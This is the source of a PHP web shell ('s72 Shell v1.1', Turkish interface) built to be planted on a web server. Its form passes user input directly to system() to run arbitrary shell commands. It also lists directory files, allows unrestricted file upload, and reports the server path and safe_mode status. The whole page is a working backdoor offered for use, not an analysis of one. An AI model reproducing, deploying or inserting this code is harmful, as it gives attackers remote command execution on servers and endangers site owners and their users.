<html>

<head>
<meta http-equiv="Content-Language" content="tr">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
<title>s72 Shell v1.0 Codinf by Cr@zy_King</title>
<meta name="Microsoft Theme" content="refined 011">
</head>

<body background="refbgd2.gif" bgcolor="#000000" text="#FFFFFF" link="#666699" vlink="#999999" alink="#999900">

<!--mstheme--><font face="Times New Roman">

<p><font face="Comic Sans MS" color="#FF0000"><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>s72 Shell v1.1 Coding by <a href="mailto:crazy_king@turkusev.net">
<font color="#00FF00">Cr@zy_King&nbsp; </font>
</a> </font></p>

      <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      <font color="#FF0000"><b><font face="Comic Sans MS" size="1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ 
      Server Bilgileri ]</td>
    </tr>
    <tr>
      <td width="49%" height="142">
      </font></b></font>
</p>
      <p align="center">
        <font color="#800080"><b><font face="Verdana" style="font-size: 8pt">
        Dizin</font></b></font><font face="Verdana" style="font-size: 8pt"><font color="#800080"><b>:</b> <? echo $_SERVER['DOCUMENT_ROOT']; ?>
        <br />
        <b>Shell Dizini:</b> <? echo $SCRIPT_FILENAME ?>
        <br>
        &nbsp;</font></font><p align="center"><form method="post">
<p align="center">
<font color="#800080">
<br>
</font><font face="Verdana" style="font-size: 8pt" color="#800080">Buraya 
Kodunuzu Yazın :)</font><font color="#111111"><br>
<br>
</font>
<font color="#FF0000">
<textarea size="70" name="command" rows="2" cols="43" ></textarea> <br>
<br><input type="submit" value="Çalıştır!"></font><font color="#FF0000"><br>
&nbsp;<br></font></p>
      </form>
      <p align="center">
        <font color="#FF0000">
        <textarea readonly size="1" rows="7" cols="53"><?php @$output = system($_POST['command']); ?></textarea></font><p align="center">
        &nbsp;<p align="center">
              <font color="#FF0000">
              <td width="49%" height="24" bgcolor="#FCFEBA">
              </font>
      <p align="center"><font color="#FF0000"><b>
      <font face="Comic Sans MS" size="1">[ Diziler -_- Dizinler ]</td>
      <td width="51%" height="24" bgcolor="#FCFEBA">
      </font></b></font>
      <form method="post">
<p align="center">
<font face="Verdana" style="font-size: 11pt">
<?
$folder=opendir('./');
while ($file = readdir($folder)) {
if($file != "." && $file != "..")
echo '<a target="_blank" href="'.$file.'">'.$file.'</a ><br>';
}
closedir($folder);
?></p>
      </form>
      <p align="center">
      <br>
        <b><font face="Comic Sans MS" size="1" color="#FF0000">[ Upload ]</font></b></font><font face="Comic Sans MS" size="1"><b><font color="#FF0000"></td></font></b></font><form enctype="multipart/form-data" method="post">
<p align="center"><br>
<br>
<font face="Verdana" style="font-size: 8pt" color="#800080">Buradan Dosya Upload Edebilirsiniz.</font><br>
<br>
<input type="file" name="file" size="20"><br>
<br>
<font style="font-size: 5pt">&nbsp;</font><br>
<input type="submit" value="Yükle!"> <br>
&nbsp;</p>
</form>
<?php

function check_file()
{
global $file_name, $filename;
    $backupstring = "copy_of_";
    $filename = $backupstring."$filename";

    if( file_exists($filename))
    {
        check_file();
    }
}

if(!empty($file))
{
    $filename = $file_name;
    if( file_exists($file_name))
    {
        check_file();
        echo "<p align=center>Dosya Zaten Bulunuyor</p>";
    }

    else
    {
        copy($file,"$filename");
        if( file_exists($filename))
        {
            echo "<p align=center>Dosya Başarılı Bir Şekilde Yüklendi</p>";
        }
        elseif(! file_exists($filename))
        {
            echo "<p align=center>Dosya Bulunamadı</p>";
        }
    }
}
?> 
<font face="Verdana" style="font-size: 8pt">
<p align=\"center\"></font>
</td>
        <font color="#111111">
        <br>
        <br>
        <br /><br /> </font>
              <?php 
// Check for Safe Mode
if( ini_get('safe_mode') ) {
   print '<font color=#FF0000><b>Güvenlik Açık</b></font>';
} else {
   print '<font color=#008000><b>Güvenlik Kapalı</b></font>';
}

?>

        <!--mstheme--></font>

        </body>

</html>